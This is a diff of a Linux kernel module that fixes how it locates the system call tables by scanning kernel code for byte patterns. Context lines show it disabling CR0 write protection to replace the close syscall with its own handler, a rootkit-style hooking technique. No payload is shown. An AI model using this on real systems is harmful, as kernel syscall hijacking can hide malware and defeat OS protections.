@@ -5,6 +5,7 @@
 
 MODULE_LICENSE("GPL");
 
+#define LOGICAL_ADDRESS_OFFSET 0xffffffff00000000
 #define SEARCH_RANGE 512
 #define PATTERN_SIZE 7
 
@@ -20,6 +21,7 @@ asmlinkage long fake_close(int fd) {
 
 void search_sys_call_table(void) {
   int i, j;
+  int entry_SYSCALL_64_offset;
   int *do_syscall_64_offset;
   int *sys_call_table_offset;
   int *ia32_sys_call_table_offset;
@@ -29,7 +31,8 @@ void search_sys_call_table(void) {
   unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
   unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};
   
-  rdmsrl(MSR_LSTAR, entry_SYSCALL_64);
+  rdmsrl(MSR_LSTAR, entry_SYSCALL_64_offset);
+  entry_SYSCALL_64 = (unsigned char *)(LOGICAL_ADDRESS_OFFSET + entry_SYSCALL_64_offset);
 
   for (i = 0; i < SEARCH_RANGE; i++) {
     for (j = 0; j < PATTERN_SIZE; j++)
@@ -56,20 +59,20 @@ void search_sys_call_table(void) {
     
     if (j == PATTERN_SIZE) {
       sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
-      sys_call_table = (void **)(*sys_call_table_offset);
+      sys_call_table = (void **)(LOGICAL_ADDRESS_OFFSET + *sys_call_table_offset);
       printk(KERN_INFO "call to sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, sys_call_table); 
       break;
     } 
   }
 
-  for (i = 0; i < SEARCH_RANGE; i++) {
+  for ( ; i < SEARCH_RANGE; i++) {
     for (j = 0; j < PATTERN_SIZE; j++)
       if (do_syscall_64[i + j] != pattern_2[j])
 	break;
 
     if (j == PATTERN_SIZE) {
       ia32_sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
-      ia32_sys_call_table = (void **)(ia32_sys_call_table_offset);
+      ia32_sys_call_table = (void **)(LOGICAL_ADDRESS_OFFSET + *ia32_sys_call_table_offset);
       printk(KERN_INFO "call to ia32_sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, ia32_sys_call_table);
     }
   }
@@ -86,8 +89,6 @@ void hook_syscall(void) {
     printk(KERN_INFO "failed to hook syscall, sys_call_table address is missing");
     return;
   }
-
-  
   
   write_cr0(read_cr0() & (~0x10000));
   real_close = (void *)sys_call_table[3];
